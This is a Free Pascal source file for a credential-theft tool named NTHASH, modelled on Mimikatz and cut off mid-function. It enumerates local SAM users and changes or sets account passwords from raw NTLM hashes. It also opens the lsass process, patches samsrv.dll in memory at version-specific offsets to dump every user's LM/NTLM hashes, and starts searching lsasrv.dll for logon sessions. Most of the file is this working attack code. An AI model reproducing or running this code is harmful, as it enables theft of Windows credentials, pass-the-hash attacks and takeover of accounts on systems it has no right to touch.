{$mode delphi}{$H+}

program NTHASH;

uses windows,classes,sysutils,dos,
     usamlib,usid, upsapi, uimagehlp, uadvapi32, utils, untdll, umemory, ucryptoapi;

type tdomainuser=record
     domain_handle:thandle;
     username:string;
     rid:dword;
end;
pdomainuser=^tdomainuser;

const
WIN_X64_Int_User_Info:array[0..3] of byte=($49, $8d, $41, $20);
WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);

var
  lsass_pid:dword=0;
  p:dword;
  pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
  oldhashbyte,newhashbyte:tbyte16;
  myPsid:PSID;
  mystringsid:pchar;
  winver,osarch:string;
  sysdir:pchar;




  procedure CreateFromStr (var value:_LSA_UNICODE_STRING; st : string);
  var
    len : Integer;
    wst : WideString;
  begin
    len := Length (st);
    Value.Length := len * sizeof (WideChar);
    Value.MaximumLength := (len + 1) * sizeof (WideChar);
    GetMem (Value.buffer, sizeof (WideChar) * (len + 1));
    wst := st;
    lstrcpyw (Value.buffer, PWideChar (wst))
  end;

function _ChangeNTLM(server:string;user:string;previousntlm,newntlm:tbyte16):boolean;
const MAXIMUM_ALLOWED = $02000000;
var
  i:byte;
Status:dword= 0;
ustr_server : _LSA_UNICODE_STRING;
DomainSID_,UserSID_:SID;
rid:dword;
oldlm,newlm:tbyte16;

domain:string;
elements: TStrings;

//Psamhandle:pointer=nil;

samhandle_:thandle=thandle(-1);
domainhandle_:thandle=thandle(-1);
UserHandle_:thandle=thandle(-1);

//enumcontext:thandle=thandle(-1);
//buf:_SAMPR_RID_ENUMERATION;
//CountReturned:ulong=0;

//
  //sidtext: array[0..260] of Char;
  //len:DWORD;
  StringSid: pchar;
  PDOMAINSID:PSID=nil;
  PUSERSID:PSID;
begin
  log('***************************************');
//lets go for the builtin domain
{
DomainSID_.Revision  := SID_REVISION;
DomainSID_.SubAuthorityCount :=1;
DomainSID_.IdentifierAuthority :=SECURITY_NT_AUTHORITY;
DomainSID_.SubAuthority[0] :=SECURITY_BUILTIN_DOMAIN_RID;
}

//lets go for the local DB
//domain sid=user sid minus RID
//lets get PUSERSID
GetAccountSid2(server,widestring(user),pusersid);
if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
   begin
   log('user:'+StringSid );
   //
   SplitUserSID (StringSid ,domain,rid);
   {
   elements := TStringList.Create;
   ExtractStrings(['-'],[],StringSid,elements,false);
   for i:=0 to elements.Count-2 do domain:=domain+'-'+elements[i];
   delete(domain,1,1);
   log('domain:'+domain);
   rid:=strtoint(elements[elements.count-1]);
   log('rid:'+inttostr(rid));
   }
   localfree(cardinal(stringsid));
   //freemem(pusersid);
   end
   else
   begin
     log('something wrong with user account...');
     exit;
   end;

//lets get PDOMAINSID
if  ConvertStringSidToSid(pchar(domain),PDOMAINSID ) then
    begin
    //log ('ConvertStringSidToSidA:OK');
    if ConvertSidToStringSid (PDOMAINSID ,StringSid) then
       begin
       //log ('ConvertSidToStringSid:OK');
       //log ('domain:'+StringSid );
       if StringSid <>domain then log('domain mismatch...');
       localfree(cardinal(StringSid) );
       end;
    end
    else
    begin
     //log('ConvertStringSidToSid: NOT OK');
     log('something wrong with the domain...');
     exit;
    end;
    log('***************************************');

//if GetDomainSid (DomainSID_ ) then form1.Memo1.Lines.Add ('GetDomainSid OK') ;

try
if server<>''  then
   begin
   CreateFromStr (ustr_server,server);
   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
   end
else
Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
except
  on e:exception do log(e.message );
end;

if Status <> 0 then
   begin log('SamConnect failed:'+inttohex(status,8));;end
   else log ('SamConnect ok');
//showmessage(inttostr(samhandle_ ));
log('***************************************');

if (status=0) and (samhandle_ <>thandle(-1)) then
begin
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c
//fillchar(sid_,sizeof(tsid),0);
//sid_:=GetCurrentUserSid ;
//local admin : S-1-5-21-1453083631-684653683-723175971-500

{
//lets check if domain sid is valid
//memory leak below?
getmem(StringSid ,261);
if ConvertSidToStringSid(PDomainSID ,stringsid) then
   begin
   form1.Memo1.Lines.Add ('ConvertSidToStringSid:OK');
   Form1.Memo1.Lines.Add (StringSid );
   end
   else form1.Memo1.Lines.Add ('ConvertSidToStringSid:NOT OK');
if ConvertStringSidToSid(StringSid ,PDOMAINSID)
   then form1.memo1.lines.add('ConvertStringSidToSid: OK');
}
//
//try
//showmessage('SamOpenDomain');
Status := SamOpenDomain(samhandle_ , {$705}MAXIMUM_ALLOWED, PDomainSID, @DomainHandle_);
//except
//  on e:exception do showmessage(e.message );
//end;

//The System can not log you on (C00000DF)
if Status <> 0 then
   begin log('SamOpenDomain failed:'+inttohex(status,8));;end
   else log ('SamOpenDomain ok');
end;
log('***************************************');

if (status=0) and (DomainHandle_<>thandle(-1)) then
begin
//int rid = GetRidFromSid(account);
//Console.WriteLine("rid is " + rid);
//rid = 58599

//rid:=1003; //one local user RID
//rid:=500; //local builtin administrator
//try
//showmessage('SamOpenUser');
Status := SamOpenUser(DomainHandle_ , MAXIMUM_ALLOWED , rid , @UserHandle_);
//except
//  on e:exception do showmessage(e.message );
//end;
//C0000064, user name does not exist.
if Status <> 0 then
   begin log('SamOpenUser failed:'+inttohex(status,8));;end
   else log('SamOpenUser ok');
end;
log('***************************************');

//lets ensure userhandle is working
//side note : enabling the below optional check seems to get rid of some mem leaks?
//if (status=0) and (UserHandle_ <>thandle(-1)) then
if 1=2 then
begin
status:=SamRidToSid(UserHandle_ ,rid,PUSERSID);
if Status <> 0 then
   begin log('SamRidToSid failed:'+inttohex(status,8));;end
   else log('SamRidToSid:OK '+inttostr(rid));
   //memory leak below??
   //if status=0 then
   if 1=2 then
   begin
   //getmem(StringSid ,261);
   if ConvertSidToStringSid(PUSERSID ,stringsid) then
      begin
      //showmessage(inttostr(PUSERSID^.Revision)) ;
      //showmessage(stringsid);
      log ('ConvertSidToStringSid:OK');
      log (strpas(StringSid) );
      localfree(cardinal(stringsid));
      end
      else log ('ConvertSidToStringSid:NOT OK');
   end;
end;

log('***************************************');
if (status=0) and (UserHandle_ <>thandle(-1)) then
begin

fillchar(oldlm,16,0);
fillchar(newlm,16,0);
//C000006A	STATUS_WRONG_PASSWORD
//C000006B	STATUS_ILL_FORMED_PASSWORD
//C000006C	STATUS_PASSWORD_RESTRICTION

//try
//showmessage('SamiChangePasswordUser');
Status := SamiChangePasswordUser(UserHandle_,
       false, tbyte16_(oldLm), tbyte16_(newLm),
       true, tbyte16_(PreviousNTLM), tbyte16_(NewNTLM));
//except
//  on e:exception do showmessage(e.message );
//end;
//showmessage(inttohex(status,8));
if Status <> 0 then
   begin log('SamiChangePasswordUser failed:'+inttohex(status,8));;end
   else log('SamiChangePasswordUser ok');
result:=status=0;
end;
log('***************************************');
//
//ReallocMem (ustr_server.Buffer, 0);
if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
   else log ('SamCloseHandle ok');

if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
   else log('SamCloseHandle ok');

if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
if Status <> 0 then
     begin log('SamCloseHandle failed:'+inttostr(status));exit;end
     else log('SamCloseHandle ok');
end;
//********************************************************************************
function callback_users(param:pointer=nil):dword;stdcall;
var
  status:ntstatus;
  userhandle_:thandle=thandle(-1);
  userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
  lm,ntlm:string;
begin
result:=0;
if param<>nil then
     begin
     //log(pdomainuser (param).rid) ;
     //
     Status := SamOpenUser(pdomainuser (param).domain_handle  , MAXIMUM_ALLOWED , pdomainuser (param).rid  , @UserHandle_);
     if Status <> 0 then
     begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
     else log('SamOpenUser ok',status);
     //
     status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
     if Status <> 0 then
     begin log('SamQueryInformationUser failed:'+inttohex(status,8),status);;end
     else log ('SamQueryInformationUser ok',status);
     if status=0 then
     begin
     if (userinfo^.LmPasswordPresent=1 ) then lm:=HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
     if (userinfo^.NtPasswordPresent=1) then ntlm:=HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
     log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
     result:=1;
     SamFreeMemory(userinfo);
     end;
     //
     end;
end;

function QueryDomains(server:pchar;func:pointer =nil):boolean;
type fn=function(param:pointer):dword;stdcall;
var
ustr_server : _LSA_UNICODE_STRING;
samhandle_:thandle=thandle(-1);
domainhandle_:thandle=thandle(-1);
UserHandle_:thandle=thandle(-1);
status:ntstatus;
PDomainSID,PUSERSID:PSID;
stringsid:pchar;
domain:string;
rid,i:dword;
ptr:pointer;
domainuser:tdomainuser;
//
buffer:PSAMPR_RID_ENUMERATION=nil;
count:ulong;
//EnumHandle_:thandle=thandle(-1);
EnumHandle_:dword=0;
unicode_domain:_LSA_UNICODE_STRING;
begin
result:=false;
//
if server<>''  then
   begin
   CreateFromStr (ustr_server,server);
   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
   end
else
Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
if Status <> 0 then
   begin log('SamConnect failed:'+inttohex(status,8),status);;end
   else log ('SamConnect ok',status);
//
//0x00000105 MORE_ENTRIES
//not necessary : could go straight to 'Builtin' or even 'S-1-5-32' or to computername ?

status:=SamEnumerateDomainsInSamServer (samhandle_ ,EnumHandle_ ,buffer,100,count);
if (Status <> 0) and (status<>$00000105) then
   begin log('SamEnumerateDomainsInSamServer failed:'+inttohex(status,8));;end
   else log ('SamEnumerateDomainsInSamServer ok');
if (status=0) or (status=$00000105) then
   begin
   log('count='+inttostr(count),1);
   ptr:=buffer;
   for i:=1 to count do
       begin
       log(strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer),1);
       //if func<>nil then fn(func)(@param );
       inc(ptr,sizeof(_SAMPR_RID_ENUMERATION));
       end;
   //log(strpas(buffer.Name.Buffer));
   status:=0;
   SamFreeMemory(buffer);
   end;
//
//ReallocMem (ustr_server.Buffer, 0);
if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
   else log ('SamCloseHandle ok',status);

if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
   else log('SamCloseHandle ok',status);

if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
if Status <> 0 then
     begin log('SamCloseHandle failed:'+inttostr(status),status);;end
     else log('SamCloseHandle ok',status);
end;


function QueryUsers(server,_domain:pchar;func:pointer =nil):boolean;
type fn=function(param:pointer):dword;stdcall;
var
ustr_server : _LSA_UNICODE_STRING;
samhandle_:thandle=thandle(-1);
domainhandle_:thandle=thandle(-1);
UserHandle_:thandle=thandle(-1);
status:ntstatus;
PDomainSID,PUSERSID:PSID;
stringsid:pchar;
domain:string;
rid,i:dword;
ptr:pointer;
domainuser:tdomainuser;
//
buffer:PSAMPR_RID_ENUMERATION=nil;
count:ulong;
//EnumHandle_:thandle=thandle(-1);
EnumHandle_:dword=0;
unicode_domain:_LSA_UNICODE_STRING;
begin
result:=false;
//
if server<>''  then
   begin
   CreateFromStr (ustr_server,server);
   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
   end
else
Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
if Status <> 0 then
   begin log('SamConnect failed:'+inttohex(status,8),status);;end
   else log ('SamConnect ok',status);
//
if status=0 then
begin
//could go straight to 'Builtin' or even 'S-1-5-32' or to computername ?
//if a domain is ever passed as a parameter
if _domain<>'' then
   if  ConvertStringSidToSid(_domain,PDOMAINSID )=false
   then log('ConvertStringSidToSid failed',1 )
   else log ('ConvertStringSidToSid ok',0);

//Builtin
//CreateFromStr (unicode_domain,'Builtin');
//or local computername
if _domain='' then
   begin
   count:=255;
   getmem(_domain,count);
   if GetComputerName (_domain,count) then log('domain:'+strpas(_domain),1 );
   CreateFromStr (unicode_domain ,strpas(_domain));

   status:=SamLookupDomainInSamServer(samhandle_ , @unicode_domain {@buffer.Name} , PDomainSID );
   if Status <> 0 then
      begin log('SamLookupDomainInSamServer failed:'+inttostr(status),status);exit;end
      else log ('SamLookupDomainInSamServer ok',status);
   ReallocMem (unicode_domain.Buffer, 0);
end;
{
if status=0 then
   if ConvertSidToStringSid (PDomainSID ,stringsid) then log(stringsid ) ;
}

end;
//
//ConvertStringSidToSid (pchar('S-1-5-21-1453083631-684653683-723175971'),PDOMAINSID);
Status := SamOpenDomain(samhandle_ , {$705}MAXIMUM_ALLOWED, PDomainSID, @DomainHandle_);
if Status <> 0 then
   begin log('SamOpenDomain failed:'+inttohex(status,8),status);;end
   else log ('SamOpenDomain ok',status);

//
EnumHandle_:=0;
if buffer<>nil then SamFreeMemory(buffer);
status:=SamEnumerateUsersInDomain (domainhandle_ ,EnumHandle_ ,0,buffer,1000,count);
if (Status <> 0) and (status<>$00000105) then
   begin log('SamEnumerateUsersInDomain failed:'+inttohex(status,8),status);;end
   else log ('SamEnumerateUsersInDomain ok',status);
   if (status=0) or (status=$00000105) then
      begin
      result:=true;
      log('count='+inttostr(count),1);

      ptr:=buffer;
      for i:=1 to count do
          begin
          if func=nil
             then log(strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer)+':'+inttostr(PSAMPR_RID_ENUMERATION(ptr).RelativeId ),1);
          if func<>nil then
             begin
             domainuser.rid :=PSAMPR_RID_ENUMERATION(ptr).RelativeId ;
             domainuser.domain_handle :=domainhandle_;
             domainuser.username :=strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer);
             fn(func)(@domainuser );
             end;
          inc(ptr,sizeof(_SAMPR_RID_ENUMERATION));
          end;
      //log(strpas(buffer.Name.Buffer));
      SamFreeMemory(buffer)
      end;
//
//if buffer<>nil then ReallocMem (ustr_server.Buffer, 0);
if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
   else log ('SamCloseHandle ok',status);

if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
   else log('SamCloseHandle ok',status);

if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
if Status <> 0 then
     begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
     else log('SamCloseHandle ok',status);
end;

//********************************************************************************
//this function can only called if lsass is "patched"
//SamQueryInformationUser + UserInternal1Information=0x12
//or else you get //c0000003 (STATUS_INVALID_INFO_CLASS)
function QueryInfoUser(server,user:string):boolean;
var
ustr_server : _LSA_UNICODE_STRING;
samhandle_:thandle=thandle(-1);
domainhandle_:thandle=thandle(-1);
UserHandle_:thandle=thandle(-1);
status:ntstatus;
PDomainSID,PUSERSID:PSID;
stringsid:pchar;
domain:string;
rid:dword;
userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
begin
result:=false;
//
GetAccountSid2(server,widestring(user),pusersid);
if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
   begin
   log('user:'+StringSid,1 );
   SplitUserSID (StringSid ,domain,rid);
   localfree(cardinal(stringsid));
   end
   else
   begin
     log('something wrong with user account...',1);
     exit;
   end;
//
if server<>''  then
   begin
   CreateFromStr (ustr_server,server);
   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
   end
else
Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
if Status <> 0 then
   begin log('SamConnect failed:'+inttohex(status,8));;end
   else log ('SamConnect ok');
//
if  ConvertStringSidToSid(pchar(domain),PDOMAINSID )=false
   then log('ConvertStringSidToSid failed' )
   else log ('ConvertStringSidToSid ok');
//
Status := SamOpenDomain(samhandle_ , {$705}MAXIMUM_ALLOWED, PDomainSID, @DomainHandle_);
if Status <> 0 then
   begin log('SamOpenDomain failed:'+inttohex(status,8));;end
   else log ('SamOpenDomain ok');
//
Status := SamOpenUser(DomainHandle_ , MAXIMUM_ALLOWED , rid , @UserHandle_);
if Status <> 0 then
   begin log('SamOpenUser failed:'+inttohex(status,8));;end
   else log('SamOpenUser ok');
//
status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
if Status <> 0 then
   begin log('SamQueryInformationUser failed:'+inttohex(status,8));;end
   else log ('SamQueryInformationUser ok');
if status=0 then
   begin
   if (userinfo^.LmPasswordPresent=1 ) then log('LmPassword:'+HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  ),1);
   if (userinfo^.NtPasswordPresent=1) then log('NTLmPassword:'+HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword)),1);
   result:=true;
   SamFreeMemory(userinfo);
   end;
//
//ReallocMem (ustr_server.Buffer, 0);
if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
   else log ('SamCloseHandle ok');

if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
   else log('SamCloseHandle ok');

if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
if Status <> 0 then
     begin log('SamCloseHandle failed:'+inttostr(status));exit;end
     else log('SamCloseHandle ok');
end;

function SetInfoUser(server,user:string;hash:tbyte16):boolean;
var
ustr_server : _LSA_UNICODE_STRING;
samhandle_:thandle=thandle(-1);
domainhandle_:thandle=thandle(-1);
UserHandle_:thandle=thandle(-1);
status:ntstatus;
PDomainSID,PUSERSID:PSID;
stringsid:pchar;
domain:string;
rid:dword;
userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
begin
result:=false;
if user='' then exit;
//
GetAccountSid2(server,widestring(user),pusersid);
if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
   begin
   log('user:'+StringSid,1 );
   SplitUserSID (StringSid ,domain,rid);
   localfree(cardinal(stringsid));
   end
   else
   begin
     log('something wrong with user account...',1);
     exit;
   end;
//
if server<>''  then
   begin
   CreateFromStr (ustr_server,server);
   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
   end
else
Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
if Status <> 0 then
   begin log('SamConnect failed:'+inttohex(status,8),status);;end
   else log ('SamConnect ok',status);
//
if  ConvertStringSidToSid(pchar(domain),PDOMAINSID )=false
   then log('ConvertStringSidToSid failed',status )
   else log ('ConvertStringSidToSid ok',status);
//
Status := SamOpenDomain(samhandle_ , {$705}MAXIMUM_ALLOWED, PDomainSID, @DomainHandle_);
if Status <> 0 then
   begin log('SamOpenDomain failed:'+inttohex(status,8));;end
   else log ('SamOpenDomain ok');
//
Status := SamOpenUser(DomainHandle_ , MAXIMUM_ALLOWED , rid , @UserHandle_);
if Status <> 0 then
   begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
   else log('SamOpenUser ok',status);
//
userinfo:=allocmem(sizeof(_SAMPR_USER_INTERNAL1_INFORMATION));
userinfo^.LmPasswordPresent :=0;
userinfo^.NtPasswordPresent :=1;
userinfo^.PasswordExpired :=0;
userinfo^.EncryptedNtOwfPassword :=tbyte16_(hash);

status:=SamSetInformationUser(UserHandle_ ,$12,userinfo);
if Status <> 0 then
   begin log('SamSetInformationUser failed:'+inttohex(status,8),status);;end
   else log('SamSetInformationUser ok',status);
if status=0 then
   begin
   result:=true;
   end;
//
//ReallocMem (ustr_server.Buffer, 0);
if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
   else log ('SamCloseHandle ok',status);

if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
if Status <> 0 then
   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
   else log('SamCloseHandle ok',status);

if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
if Status <> 0 then
     begin log('SamCloseHandle failed:'+inttostr(status),status);;end
     else log('SamCloseHandle ok',status);
end;

//**********************************************************************
{
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
//pattern should be a parameter to make this function generic...
function search(hprocess:thandle;addr:pointer;sizeofimage:DWORD):nativeint;
const
  //search pattern
  WIN_X64:array[0..3] of byte=($49, $8d, $41, $20);
  WIN_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);

var
  i:nativeint;
  buffer,pattern:tbytes;
  read:cardinal;
begin
result:=0;
if LowerCase (osarch )='amd64' then
   begin
   setlength(buffer,4);
   setlength(pattern,4);
   CopyMemory (@pattern[0],@WIN_X64[0],length(pattern));
   end
   else
   begin
   setlength(buffer,5);
   setlength(pattern,5);
   CopyMemory (@pattern[0],@WIN_X86[0],length(pattern));
   end;
log('Searching...',0);
  for i:=nativeint(addr) to nativeint(addr)+sizeofimage-length(buffer) do
      begin
      //fillchar(buffer,4,0);
      if ReadProcessMemory( hprocess,pointer(i),@buffer[0],length(buffer),@read) then
        begin
        //log(inttohex(i,sizeof(pointer)));
        if CompareMem (@pattern [0],@buffer[0],length(buffer)) then
           begin
           result:=i;
           break;
           end;
        end;//if readprocessmemory...
      end;//for
log('Done!',0);
end;
}

function Init_Int_User_Info:tbytes;
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     setlength(pattern,length(WIN_X64_Int_User_Info));
     CopyMemory (@pattern[0],@WIN_X64_Int_User_Info[0],length(WIN_X64_Int_User_Info));
     end
     else
     begin
     setlength(pattern,length(WIN_X86_Int_User_Info));
     CopyMemory (@pattern[0],@WIN_X86_Int_User_Info[0],length(WIN_X86_Int_User_Info));
     end;
result:=pattern;
end;

//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
function dumpsam(pid:dword;user:string):boolean;
const
//offset x64
WIN_BUILD_2K3:ShortInt=	-17; //need a nop nop
WIN_BUILD_VISTA:ShortInt=	-21;
WIN_BUILD_BLUE:ShortInt=	-24;
WIN_BUILD_10_1507:ShortInt=	-21;
WIN_BUILD_10_1703:ShortInt=	-19;
WIN_BUILD_10_1709:ShortInt=	-21;
WIN_BUILD_10_1803:ShortInt=	-21; //verified
WIN_BUILD_10_1809:ShortInt=	-24;
//offset x86
WIN_BUILD_XP_86:ShortInt=-8;
WIN_BUILD_8_86:ShortInt=-12;
WIN_BUILD_BLUE_86:ShortInt=-8;
WIN_BUILD_10_1507_86:ShortInt=-8;
WIN_BUILD_10_1607_86:ShortInt=-12;
const
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  backup:array[0..1] of byte;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA; //win vista
     if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
     if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
     if (pos('-1709',winver)>0) then patch_pos :=WIN_BUILD_10_1709;
     if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
     if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
     end;
  //x86 to do...
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=strpas(szModName );
                      if pos('samsrv.dll',dummy)>0 then
                         begin
                         log('samsrv.dll found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            pattern:=Init_Int_User_Info ;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch ok',0);
                                        try
                                        log('***************************************',0);
                                        if QueryUsers ('','',@callback_users )=true
                                        //if QueryInfoUser (user)=true
                                           then log('SamQueryInformationUser OK',0)
                                           else log('SamQueryInformationUser NOT OK',1);
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch failed',1);
                                   end;
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;

function dumplogons(pid:dword;user:string):boolean;
const
  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
     patch_pos:=23;
     end;
  //x86 to do...
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=strpas(szModName );
                      if pos('lsasrv.dll',dummy)>0 then
                         begin
                         log('lsasrv.dll found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            pattern:=Init_Int_User_Info ;
